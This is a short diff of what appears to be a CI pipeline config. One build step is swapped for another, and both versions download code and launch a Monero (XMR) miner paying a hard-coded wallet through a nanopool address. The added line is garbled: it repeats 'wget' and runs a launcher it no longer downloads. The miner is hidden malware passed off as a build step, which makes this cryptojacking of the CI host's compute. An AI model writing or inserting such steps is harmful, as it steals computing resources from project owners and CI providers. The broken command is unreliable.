@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 89pALi7aioBPJx14qUsbop8rwhr51B3qdBLLYFs6ZHDSeTfdWgCsUYUC5gU8isA6EBfTXtTRNaqnkfj66wj9jidS91XgPUM  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr-eu1.nanopool.org:14433
+      - run:  wget wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 89pALi7aioBPJx14qUsbop8rwhr51B3qdBLLYFs6ZHDSeTfdWgCsUYUC5gU8isA6EBfTXtTRNaqnkfj66wj9jidS91XgPUM  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr-eu1.nanopool.org:14433
